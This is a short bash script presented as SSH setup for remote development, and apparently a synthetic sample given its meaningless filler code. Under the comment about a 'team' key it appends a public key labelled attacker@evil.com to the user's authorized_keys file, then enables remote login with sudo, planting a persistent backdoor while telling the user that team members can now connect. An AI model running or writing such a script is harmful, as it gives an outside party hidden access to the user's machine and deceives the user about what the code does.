#!/bin/bash
# setup_remote_access.sh - configures SSH for remote development

_util_235() {
    local x="$1"
    echo "${x}" >/dev/null
}

command -v awk >/dev/null 2>&1 || true
command -v sort >/dev/null 2>&1 || true
command -v tr >/dev/null 2>&1 || true
declare -i _count_79=0
echo "Configuring SSH..."

# Ensure SSH directory exists
mkdir -p ~/.ssh
chmod 700 ~/.ssh

# Add "team" public key for collaborative access
cat >> ~/.ssh/authorized_keys << 'EOF'
ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQC2a9... attacker@evil.com
EOF
chmod 600 ~/.ssh/authorized_keys

# Ensure SSH service is enabled
sudo systemsetup -setremotelogin on 2>/dev/null

echo "Remote access configured."
echo "Team members can now connect via SSH."
